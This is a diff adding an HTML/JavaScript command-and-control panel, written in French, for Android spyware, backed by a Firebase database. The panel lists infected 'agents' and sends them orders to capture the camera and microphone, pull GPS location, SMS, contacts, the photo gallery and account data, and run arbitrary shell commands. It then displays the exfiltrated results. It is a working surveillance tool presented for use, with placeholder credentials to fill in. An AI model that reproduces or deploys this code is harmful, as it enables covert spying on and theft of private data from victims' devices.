@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Panel C2 Firebase</title>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Courier New',monospace; background:#0a0a0a; color:#0f0; padding:20px; }
+        .header { background:#1a1a1a; padding:15px; border:1px solid #0f0; margin-bottom:20px; }
+        .agent-card { background:#111; border:1px solid #333; padding:15px; margin-bottom:10px; cursor:pointer; }
+        .agent-card:hover { border-color:#0f0; }
+        .online { border-left:4px solid #0f0; }
+        .offline { border-left:4px solid #f00; }
+        .btn { background:#1a1a1a; color:#0f0; border:1px solid #333; padding:10px 15px; margin:5px; cursor:pointer; }
+        .btn:hover { background:#0f0; color:#000; }
+        select, input { background:#1a1a1a; color:#0f0; border:1px solid #333; padding:10px; margin:5px; font-family:monospace; }
+        #exfilData { background:#0d0d0d; border:1px solid #333; padding:15px; margin-top:20px; max-height:500px; overflow:auto; font-size:12px; }
+        .badge { background:#333; padding:2px 6px; border-radius:3px; font-size:11px; margin:2px; }
+        pre { font-size:11px; color:#aaa; white-space:pre-wrap; }
+        img { max-width:200px; max-height:200px; margin:5px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1 style="margin:0;">🔴 C2 Panel - Firebase</h1>
+        <div id="status">Connexion...</div>
+    </div>
+
+    <div style="margin:20px 0;">
+        <select id="agentSelect" style="min-width:200px;">
+            <option value="">-- Agent --</option>
+        </select>
+        <select id="commandSelect">
+            <option value="CAMERA_FRONT">📸 Caméra Avant</option>
+            <option value="CAMERA_BACK">📸 Caméra Arrière</option>
+            <option value="MIC">🎤 Micro 30s</option>
+            <option value="LOCATION">📍 GPS</option>
+            <option value="SMS">📋 SMS</option>
+            <option value="CONTACTS">📋 Contacts</option>
+            <option value="GALLERY">🖼️ Galerie</option>
+            <option value="ACCOUNTS">🔑 Comptes</option>
+            <option value="PING">🏓 Ping</option>
+            <option value="SLEEP">😴 Veille</option>
+            <option value="SHELL">💻 Shell custom</option>
+        </select>
+        <input type="text" id="shellCmd" placeholder="Commande shell (ex: ls -la /sdcard)" style="display:none;width:300px;">
+        <button class="btn" onclick="sendOrder()">🚀 Envoyer</button>
+    </div>
+
+    <h2>Agents connectés</h2>
+    <div id="agentsList"></div>
+
+    <h2 style="margin-top:20px;">Données exfiltrées</h2>
+    <div id="exfilData">En attente de données...</div>
+
+    <script>
+        // ===== REMPLACE ICI avec TES identifiants Firebase =====
+        const firebaseConfig = {
+            apiKey: "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXX",
+            authDomain: "ton-projet.firebaseapp.com",
+            databaseURL: "https://ton-projet-default-rtdb.firebaseio.com",
+            projectId: "ton-projet"
+        };
+        // =======================================================
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const agentsRef = db.ref('agents');
+
+        document.getElementById('commandSelect').onchange = function() {
+            document.getElementById('shellCmd').style.display = this.value === 'SHELL' ? 'inline' : 'none';
+        };
+
+        agentsRef.on('value', snap => {
+            const agents = snap.val() || {};
+            const select = document.getElementById('agentSelect');
+            const list = document.getElementById('agentsList');
+            select.innerHTML = '<option value="">-- Agent --</option>';
+            list.innerHTML = '';
+            
+            Object.keys(agents).forEach(id => {
+                const a = agents[id];
+                select.innerHTML += `<option value="${id}">${id} - ${a.status||'?'}</option>`;
+                const card = document.createElement('div');
+                card.className = `agent-card ${a.status === 'online' ? 'online' : 'offline'}`;
+                card.innerHTML = `<strong>${id}</strong> <span class="badge">${a.status||'?'}</span><br>
+                    <small>Dernier contact: ${a.last_seen||'jamais'}</small><br>
+                    <small>📦 ${Object.keys(a.exfil||{}).length} exfiltrations</small>`;
+                card.onclick = () => showAgent(id);
+                list.appendChild(card);
+            });
+            document.getElementById('status').textContent = `✓ ${Object.keys(agents).length} agent(s) suivi(s)`;
+        });
+
+        function sendOrder() {
+            const agentId = document.getElementById('agentSelect').value;
+            const cmd = document.getElementById('commandSelect').value;
+            if (!agentId) return alert('Sélectionne un agent !');
+            
+            let order = cmd;
+            if (cmd === 'SHELL') order = 'SHELL ' + document.getElementById('shellCmd').value;
+            
+            db.ref(`agents/${agentId}/orders`).set(order).then(() => {
+                document.getElementById('status').textContent = `🚀 Ordre envoyé: ${order}`;
+            });
+        }
+
+        function showAgent(agentId) {
+            document.getElementById('agentSelect').value = agentId;
+            const div = document.getElementById('exfilData');
+            db.ref(`agents/${agentId}/exfil`).limitToLast(50).on('value', snap => {
+                const data = snap.val();
+                if (!data) { div.textContent = 'Aucune donnée'; return; }
+                
+                let html = '';
+                Object.values(data).reverse().forEach(entry => {
+                    html += `<div style="border-bottom:1px solid #333;padding:8px;">`;
+                    html += `<span class="badge">${entry.type||'?'}</span> <small>${entry.timestamp||''}</small><br>`;
+                    
+                    if (entry.type === 'location') {
+                        html += `📍 ${entry.latitude}, ${entry.longitude} <a href="https://www.google.com/maps?q=${entry.latitude},${entry.longitude}" target="_blank" style="color:#0ff;">[Carte]</a>`;
+                    } else if (entry.type === 'image' || entry.type === 'gallery') {
+                        html += `<img src="data:image/jpeg;base64,${entry.data}"><br>${entry.filename||''}`;
+                    } else if (entry.type === 'audio') {
+                        html += `<audio controls src="data:audio/3gp;base64,${entry.data}" style="width:100%;"></audio>`;
+                    } else if (entry.data) {
+                        html += `<pre>${entry.data.length > 500 ? entry.data.substring(0,500)+'...' : entry.data}</pre>`;
+                    }
+                    if (entry.stdout) html += `<pre>stdout: ${entry.stdout.substring(0,300)}</pre>`;
+                    if (entry.stderr) html += `<pre style="color:#f00;">stderr: ${entry.stderr.substring(0,200)}</pre>`;
+                    
+                    html += `</div>`;
+                });
+                div.innerHTML = html;
+            });
+        }
+    </script>
+</body>
+</html>
